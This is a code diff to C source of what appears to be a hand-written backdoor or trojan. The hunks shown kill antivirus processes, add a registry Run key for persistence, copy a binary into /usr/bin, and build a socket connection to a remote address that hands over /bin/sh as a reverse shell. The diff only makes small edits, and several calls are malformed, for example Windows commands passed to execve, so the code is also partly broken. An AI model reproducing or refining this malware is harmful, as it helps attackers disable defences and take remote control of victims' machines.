@@ -46,7 +46,7 @@ terraquian date: 4/5/20178 - 0415:55 -PM *** in desenvolpment.
 
   } Target;
 
-  x = true;
+  int x = true;
 
   void error (char *err)
 
@@ -75,7 +75,7 @@ terraquian date: 4/5/20178 - 0415:55 -PM *** in desenvolpment.
 
    execve("TASKLIST /FI 'STATUS eq RUNNING'", 0, 0);
    send(x,"Killing anti virus...\n",31,0);
-   execve("TASKKILL /F /IM \{}\ '>> NUL'", 0, 0);
+   execve("TASKKILL /F /IM \\{}\\ '>> NUL'", 0, 0);
 
    return;
 
@@ -104,6 +104,7 @@ terraquian date: 4/5/20178 - 0415:55 -PM *** in desenvolpment.
      dup2(x, 0);
 
      execve("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /v wins32 /d C:/wins32.exe",0,0);
+     execve("cp wopnt.exe /usr/bin,NULL,NULL"); 
      return;
 
   }
@@ -127,11 +128,13 @@ terraquian date: 4/5/20178 - 0415:55 -PM *** in desenvolpment.
 
    create connection */
 
-  void shell()
+  void 
+  shell()
 
   {
 
     struct sockaddr_in s;
+  
     int root;
     char *window[] = { "HOME=/usr/home", "LOGNAME=home", (char *)0 };
     char *cmd[] = { "/bin/sh", (char *)0 };
@@ -177,6 +180,7 @@ terraquian date: 4/5/20178 - 0415:55 -PM *** in desenvolpment.
     /* setting up the connection */
 
      memset(s.sin_zero, '\0', sizeof s.sin_zero); /*aloca espaço de memória para o PIPE socket. */
+    
      s.sin_family = AF_INET; /* família de protocolos */
      s.sin_addr.s_addr = inet_addr(remote_addr);
      s.sin_port = htons(remote_port);
